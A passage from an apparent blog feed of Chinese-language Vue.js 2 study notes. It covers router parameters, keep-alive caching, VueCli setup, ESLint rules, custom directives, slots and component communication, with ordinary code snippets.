function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="路由传参"><a href="#路由传参" class="headerlink" title="路由传参"></a>路由传参</h2><p><strong>path路径跳转传参（query传参）</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/路径?参数名1=参数值1&amp;参数2=参数值2&#x27;</span>)</span><br><span class="line"><span class="comment">//完整写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/路径&#x27;</span>,</span><br><span class="line">  <span class="attr">query</span>: &#123;</span><br><span class="line">    参数名<span class="number">1</span>: <span class="string">&#x27;参数值1&#x27;</span>,</span><br><span class="line">    参数名<span class="number">2</span>: <span class="string">&#x27;参数值2&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>path路径跳转传参（动态路由传参）</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//简单写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/路径/参数值&#x27;</span>)</span><br><span class="line"><span class="comment">//完整写法</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/路径/参数值&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>name命名路由跳转传参（query传参）</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名字&#x27;</span>,</span><br><span class="line">  <span class="attr">query</span>: &#123;</span><br><span class="line">    参数名<span class="number">1</span>: <span class="string">&#x27;参数值1&#x27;</span>,</span><br><span class="line">    参数名<span class="number">2</span>: <span class="string">&#x27;参数值2&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>**name命名路由跳转传参 (动态路由传参)**：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(&#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;路由名字&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    参数名: <span class="string">&#x27;参数值&#x27;</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="组件缓存-keep-alive"><a href="#组件缓存-keep-alive" class="headerlink" title="组件缓存 keep-alive"></a>组件缓存 keep-alive</h1><p>keep-alive 是 Vue 的内置组件，当它包裹动态组件时，会<strong>缓存不活动</strong>的组件实例，而<strong>不是销毁</strong>它们。</p><p>keep-alive 是一个抽象组件：它自身不会渲染成一个 DOM 元素，也不会出现在父组件中。</p><p><strong>优点</strong>：在组件切换过程中把切换出去的组件保留在内存中，防止重复渲染DOM，减少加载时间及性能消耗，提高用户体验性。</p><h2 id="keep-alive-的三个属性"><a href="#keep-alive-的三个属性" class="headerlink" title="keep-alive 的三个属性"></a>keep-alive 的三个属性</h2><ol><li>include ： 组件名数组，只有匹配的组件<strong>会被缓存</strong></li><li>exclude ： 组件名数组，任何匹配的组件都<strong>不会被缓存</strong></li><li>max ： 最多可以<strong>缓存多少</strong>组件实例</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325164143.png" alt="image.png"></p><h2 id="两个生命周期函数"><a href="#两个生命周期函数" class="headerlink" title="两个生命周期函数"></a>两个生命周期函数</h2><p><strong>keep-alive的使用会触发两个生命周期函数</strong>：</p><ul><li><strong>activated</strong> 当组件被激活（使用）的时候触发 → 进入这个页面的时候触发</li><li><strong>deactivated</strong> 当组件不被使用的时候触发 → 离开这个页面的时候触发</li></ul><p>组件<strong>缓存后</strong>就<strong>不会执行</strong>组件的<strong>created, mounted, destroyed</strong> 等钩子了</p><p>所以其提供了<strong>actived 和deactived</strong>钩子，帮我们实现业务需求。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">activated () &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;activated 激活，进入页面&#x27;</span>)</span><br><span class="line">&#125;,</span><br><span class="line">deactivated () &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;deactivated 失活，进入页面&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="VueCli-自定义创建项目"><a href="#VueCli-自定义创建项目" class="headerlink" title="VueCli 自定义创建项目"></a>VueCli 自定义创建项目</h1><ol><li><p>需要安装脚手架</p></li><li><p>创建项目（这里的项目名称是test11-cli）</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create test11-cli</span><br></pre></td></tr></table></figure><ol start="3"><li>选择创建模式，选自定义Manually select features</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201034.png" alt="image.png"></p><ol start="4"><li>选择功能，这里Babel用于es6转译es3，Router为路由，CSS Pre-processors用于使用less、scss，Linter&#x2F;Formatter为eslint校验代码格式</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201106.png" alt="image.png"></p><ol start="5"><li>选择Vue版本，这里我选择Vue2.x</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201119.png" alt="image.png"></p><ol start="6"><li>是否使用history模式，我这里选择否，使用hash模式</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201134.png" alt="image.png"></p><ol start="7"><li>选择CSS预处理</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201146.png" alt="image.png"></p><ol start="8"><li>选择eslint风格，这里选择标准风格</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201205.png" alt="image.png"></p><ol start="9"><li>选择校验的时机，选择正常开启，保存校验</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201218.png" alt="image.png"></p><ol start="10"><li>选择配置文件的生成方式，选择把配置文件生成到单独的文件当中，便于维护</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201231.png" alt="image.png"></p><ol start="11"><li>选择是否保留预设</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201247.png" alt="image.png"></p><ol start="12"><li>选择使用Yarn还是NPM</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325201318.png" alt="image.png"></p><ol start="13"><li>等待安装，项目初始化完成</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325202101.png" alt="image.png"></p><h1 id="ESlint-代码规范"><a href="#ESlint-代码规范" class="headerlink" title="ESlint 代码规范"></a>ESlint 代码规范</h1><p>代码有书写规格，需要遵循指定的约定规则</p><p><strong>JavaScript Standard Style 规范说明</strong>：<a href="https://standardjs.com/rules-zhcn.html">https://standardjs.com/rules-zhcn.html</a></p><p>下面是这份规则中的<strong>一小部分</strong>：</p><ul><li>字符串使用单引号 – 需要转义的地方除外</li><li>语句结尾无分号</li><li>关键字后加空格 <code>if (condition) &#123; ... &#125;</code></li><li>函数名后加空格 <code>function name (arg) &#123; ... &#125;</code></li><li>坚持使用全等 <code>===</code> ，摒弃 <code>==</code></li></ul><p> </p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682942554314.png" alt="1682942554314.png"></p><h2 id="自动修复规范错误"><a href="#自动修复规范错误" class="headerlink" title="自动修复规范错误"></a>自动修复规范错误</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325205123.png" alt="image.png"></p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240325205305.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-自定义指令、插槽</title>
      <link href="/2024/03/24/Vue-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E3%80%81%E6%8F%92%E6%A7%BD/"/>
      <url>/2024/03/24/Vue-%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%E3%80%81%E6%8F%92%E6%A7%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="自定义指令"><a href="#自定义指令" class="headerlink" title="自定义指令"></a>自定义指令</h1><p><strong>概念</strong>：自己定义的指令，可以封装一些dom操作，扩展额外的功能</p><ul><li>inserted：被绑定元素插入父节点时调用的钩子函数</li><li>el：使用指令的那个DOM元素</li></ul><p><strong>全局注册</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">directive</span>(<span class="string">&#x27;指令名&#x27;</span>, &#123;</span><br><span class="line"><span class="string">&quot;inserted&quot;</span> (el) &#123;</span><br><span class="line"><span class="comment">// inserted指的是当组件被插入到页面时</span></span><br><span class="line"><span class="comment">// 可以对el标签，扩展额外功能</span></span><br><span class="line">el.<span class="title function_">focus</span>() <span class="comment">// 实现对元素的聚焦</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><strong>局部注册</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">directives</span>: &#123;</span><br><span class="line"><span class="string">&quot;指令名&quot;</span>: &#123;</span><br><span class="line"><span class="title function_">inserted</span>(<span class="params"></span>) &#123;</span><br><span class="line">el.<span class="title function_">focus</span>()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>使用</strong>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-指令名</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ul><li>在使用指令的时候，一定要<strong>先注册</strong>，<strong>再使用</strong>，否则会报错</li><li>使用指令语法： v-指令名。如：<code>&lt;input type=&quot;text&quot;  v-focus/&gt;</code>  </li><li><strong>注册</strong>指令时<strong>不用</strong>加v-前缀，但使用时<strong>一定</strong>要加v-前缀</li></ul><h2 id="获取指令值"><a href="#获取指令值" class="headerlink" title="获取指令值"></a>获取指令值</h2><ol><li>在绑定命令时，可以通过等号获取绑定具体的参数值</li><li>通过 <code>binding.value</code> 可以拿到指令值，指令值<strong>修改</strong>会触发 update 函数</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-color</span>=<span class="string">&quot;color1&quot;</span>&gt;</span>我是测试1<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">v-color</span>=<span class="string">&quot;color2&quot;</span>&gt;</span>我是测试2<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">color1</span>: <span class="string">&#x27;red&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">color2</span>: <span class="string">&#x27;green&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">directives</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">color</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">inserted</span>(<span class="params">el, binding</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        el.<span class="property">style</span>.<span class="property">color</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">      &#125;,</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">update</span>(<span class="params">el, binding</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        el.<span class="property">style</span>.<span class="property">color</span> = binding.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="插槽"><a href="#插槽" class="headerlink" title="插槽"></a>插槽</h1><p><strong>作用</strong>：让组件内部的一些结果内容支持自定义</p><p><strong>场景</strong>：当一个组件被多次使用，但是其内容不一样，不能写死，就需要插槽来自定义</p><p><strong>语法</strong>：</p><ol><li>组件内，需要自定义的部分，使用<code>&lt;slot&gt;&lt;/slot&gt;</code>占位</li><li>使用组件时，<code>&lt;组件名&gt;自定义内容&lt;/组件名&gt;</code>标签内部传入结果替代slot</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682410329794.png" alt="1682410329794.png"></p><h2 id="默认值"><a href="#默认值" class="headerlink" title="默认值"></a>默认值</h2><p>当没有内容传入时，需要默认值占位，可以为<code>&lt;slot&gt;</code>添加内容提供默认值</p><p><strong>语法</strong>：在<code>&lt;slot&gt;默认内容&lt;/slot&gt;</code>标签内放置内容，作为默认显示内容</p><h2 id="具名插槽"><a href="#具名插槽" class="headerlink" title="具名插槽"></a>具名插槽</h2><p>当一个组件内有多个内容需要定制时</p><p><strong>具名插槽语法</strong>：</p><ol><li>多个 slot 使用 name属性 区分名字</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682413391727.png" alt="1682413391727.png"></p><ol start="2"><li><code>template</code> 配合 <code>v-slot:名字</code> 来分发对于标签</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682413411921.png" alt="1682413411921.png"></p><ol start="3"><li><code>v-slot:插槽名</code>：可以简化为 <code>#插槽名</code></li></ol><h2 id="作用域插槽"><a href="#作用域插槽" class="headerlink" title="作用域插槽"></a>作用域插槽</h2><p><strong>作用</strong>：定义 slot 插槽的同时, 是可以传值的。插槽上可以绑定数据，将来使用组件时可以用。 </p><p><strong>场景</strong>：当使用插槽传递自定义内容时，需要发回参数给父组件时</p><ol><li>父传子，通过<code>#插槽名</code>传递自定义内容</li><li>子组件在slot标签内，添加属性用来传递参数，参数会被收集成一个对象</li><li>被传递回父组件的参数会以对象的形式被接收</li></ol><p><strong>使用步骤</strong>：</p><ol><li>给slot标签，以添加属性的方式传值</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">slot</span> <span class="attr">:id</span>=<span class="string">&quot;item.id&quot;</span> <span class="attr">msg</span>=<span class="string">&quot;测试文本&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">slot</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>所有添加的属性都会被收集到一个对象中，传回父组件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">id</span>: <span class="number">3</span>, <span class="attr">msg</span>: <span class="string">&quot;测试文本&quot;</span>&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>在 template 中，通过 <code>#插槽名= &quot;obj&quot;</code> 接收，默认插槽名为 default</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">MyTable</span> <span class="attr">:list</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> #<span class="attr">default</span>=<span class="string">&quot;obj&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;del(obj.id)&quot;</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">MyTable</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> Vue.js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue-组件通信、进阶用法</title>
      <link href="/2024/03/24/Vue-%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E3%80%81%E8%BF%9B%E9%98%B6%E7%94%A8%E6%B3%95/"/>
      <url>/2024/03/24/Vue-%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E3%80%81%E8%BF%9B%E9%98%B6%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="组件三大组成部分"><a href="#组件三大组成部分" class="headerlink" title="组件三大组成部分"></a>组件三大组成部分</h1><p><strong>结构</strong><code>&lt;template&gt;</code>：</p><ul><li>只能有一个根元素</li></ul><p><strong>样式</strong><code>&lt;style&gt;</code>：</p><ul><li>全局样式(默认)：影响所有组件 </li><li>局部样式：scoped 下样式，只作用于 当前组件</li></ul><p><strong>逻辑</strong><code>&lt;script&gt;</code>：</p><ul><li>el 根实例独有, data 是一个函数, 其他配置项一致</li></ul><h2 id="组件样式冲突-scoped"><a href="#组件样式冲突-scoped" class="headerlink" title="组件样式冲突 scoped"></a>组件样式冲突 scoped</h2><p><strong>默认情况</strong>：写在组件中的样式会 <strong>全局生效</strong> ，因此很容易造成多个组件之间的样式冲突问题。</p><ol><li><strong>全局样式</strong>: 默认组件中的样式会作用到全局，任何一个组件中都会受到此样式的影响</li><li><strong>局部样式</strong>: 可以给组件加上<strong>scoped</strong> 属性,可以<strong>让样式只作用于当前组件</strong></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>scoped原理</strong>：</p><ol><li>当前组件内标签都被添加<code>data-v-hash值</code> 的属性</li><li>css选择器都被添加 <code>[data-v-hash值]</code> 的属性选择器</li></ol><p>最终效果: <strong>必须是当前组件的元素</strong>, 才会有这个自定义属性, 才会被这个样式作用到</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240324102614.png" alt="image.png"></p><h2 id="data-是一个函数"><a href="#data-是一个函数" class="headerlink" title="data 是一个函数"></a>data 是一个函数</h2><p>一个组件的 <strong>data</strong> 选项必须<strong>是一个函数</strong>。目的是为了：保证每个组件实例，维护<strong>独立</strong>的一份<strong>数据</strong>对象。</p><p>每次创建新的组件实例，都会新<strong>执行一次data 函数</strong>，得到一个新对象。</p><h1 id="组件通信"><a href="#组件通信" class="headerlink" title="组件通信"></a>组件通信</h1><p>组件通信，就是指<strong>组件与组件</strong>之间的<strong>数据传递</strong></p><ul><li>组件的数据是独立的，无法直接访问其他组件的数据。</li><li>想使用其他组件的数据，就需要组件通信</li></ul><p><strong>通信解决方案</strong>：</p><ul><li>父子关系：props &amp; $emit</li><li>非父子关系：provide &amp; inject 、 eventbus</li><li>通用解决方案：Vuex（适用于复杂业务场景）</li></ul><h2 id="父子通信"><a href="#父子通信" class="headerlink" title="父子通信"></a>父子通信</h2><p><strong>父 → 子</strong>：</p><p>父组件通过 <strong>props</strong> 将数据传递给子组件</p><ol><li>父组件给子组件以添加熟悉的方式传值</li><li>子组件内部通过 props 接收数据</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682318711785.png" alt="1682318711785.png"></p><p><strong>子 → 父</strong>：</p><p>子组件利用 <strong>$emit</strong> 通知父组件修改更新</p><ol><li>子组件通过 $emit 触发事件，传递参数给父组件</li><li>父组件通过事件监听子组件，获取参数</li></ol><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682318965635.png" alt="1682318965635.png"></p><h3 id="prop-概念"><a href="#prop-概念" class="headerlink" title="prop 概念"></a>prop 概念</h3><p><strong>Prop 定义</strong>：组件上 注册的一些 <strong>自定义属性</strong> </p><p><strong>Prop 作用</strong>：向子组件传递数据  </p><p><strong>prop 特点</strong>：</p><ul><li>可以传递 <strong>任意数量</strong> 的prop</li><li>可以传递 <strong>任意类型</strong> 的prop</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/1682320156914.png" alt="1682320156914.png"></p><h3 id="prop-校验"><a href="#prop-校验" class="headerlink" title="prop 校验"></a>prop 校验</h3><p><strong>作用</strong>：为组件的 prop 指定<strong>验证要求</strong>，不符合要求，控制台就会有<strong>错误提示</strong> → 帮助开发者，快速发现错误</p><p><strong>语法</strong>：</p><ul><li><strong>类型校验</strong></li><li>非空校验</li><li>默认值</li><li>自定义校验</li></ul><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240324133413.png" alt="image.png"></p><h3 id="prop-data-、单向数据流"><a href="#prop-data-、单向数据流" class="headerlink" title="prop &amp; data 、单向数据流"></a>prop &amp; data 、单向数据流</h3><p><strong>prop &amp; data 共同点</strong>：都可以给组件提供数据</p><p><strong>区别</strong>：</p><ul><li>data 的数据是<strong>自己</strong>的，可以随便改</li><li>prop 的数据是<strong>外部</strong>的，不能直接改，要遵循 <strong>单向数据流</strong></li></ul><p><strong>单向数据流</strong>：父级props 的数据更新，会向下流动，影响子组件。这个数据流动是<strong>单向的</strong></p><p>子改父数据的<strong>步骤</strong>：</p><ol><li>在子组件添加触发事件，并用<code>this.$emit()</code>将数据传回给父组件</li><li>父组件需要在子组件添加事件监听，获取新数据并且赋值</li></ol><h2 id="非父子通信"><a href="#非父子通信" class="headerlink" title="非父子通信"></a>非父子通信</h2><h3 id="event-bus-事件总线"><a href="#event-bus-事件总线" class="headerlink" title="event bus 事件总线"></a>event bus 事件总线</h3><p><strong>作用</strong>：非父子组件之间，进行简易的消息传递</p><p><strong>步骤</strong>：</p><ol><li>创建一个都能够访问的事件总线 EventBus.js（空 Vue 实例）</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Bus</span> = <span class="keyword">new</span> <span class="title class_">Vue</span>()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Bus</span></span><br></pre></td></tr></table></figure><ol start="2"><li>A组件（接受方），监听<code>Bus.$on</code>事件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">created () &#123;</span><br><span class="line">  <span class="title class_">Bus</span>.$on(<span class="string">&#x27;sendMsg&#x27;</span>, <span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">msg</span> = msg</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>B组件（发送方），触发<code>Bus.$emit</code>事件</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Bus</span>.$emit(<span class="string">&#x27;sendMsg&#x27;</span>, <span class="string">&#x27;这是一个消息&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="provide-inject"><a href="#provide-inject" class="headerlink" title="provide &amp; inject"></a>provide &amp; inject</h3><p><strong>作用</strong>：跨层级共享数据</p><p><strong>父组件 provide 提供数据</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  provide () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">       <span class="comment">// 普通类型非响应式</span></span><br><span class="line">       <span class="attr">color</span>: <span class="variable language_">this</span>.<span class="property">color</span>, </span><br><span class="line">       <span class="comment">// 复杂类型响应式（推荐）</span></span><br><span class="line">       <span class="attr">userInfo</span>: <span class="variable language_">this</span>.<span class="property">userInfo</span>, </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>子&#x2F;孙组件 inject 获取数据</strong>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">inject</span>: [<span class="string">&#x27;color&#x27;</span>,<span class="string">&#x27;userInfo&#x27;</span>],</span><br><span class="line">  created () &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">color</span>, <span class="variable language_">this</span>.<span class="property">userInfo</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>provide提供的简单类型的数据不是响应式的，复杂类型数据是响应式。（推荐提供复杂类型数据）</li><li>子&#x2F;孙组件通过inject获取的数据，<strong>不能</strong>在自身组件内修改</li></ul><h1 id="进阶用法"><a href="#进阶用法" class="headerlink" title="进阶用法"></a>进阶用法</h1><h2 id="v-model-原理"><a href="#v-model-原理" class="headerlink" title="v-model 原理"></a>v-model 原理</h2><p><strong>原理</strong>：</p><p>v-model本质上是一个<strong>语法糖</strong>。例如应用在输入框上，就是 value属性 和 input事件 的合写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 